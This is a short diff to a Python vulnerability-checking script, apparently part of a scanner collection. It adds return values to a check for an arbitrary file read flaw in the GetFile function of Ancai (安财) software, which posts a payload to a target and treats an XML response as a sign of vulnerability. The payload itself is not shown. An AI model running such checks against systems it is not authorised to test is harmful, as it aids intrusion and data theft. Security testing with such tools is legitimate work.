@@ -30,9 +30,14 @@ class acsoft_GetFile_fileread_BaseVerify:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
                 cprint("[+]存在安财软件GetFile任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return True
+            else:
+                cprint("[-]不存在安财软件GetFile任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return False
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return False
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
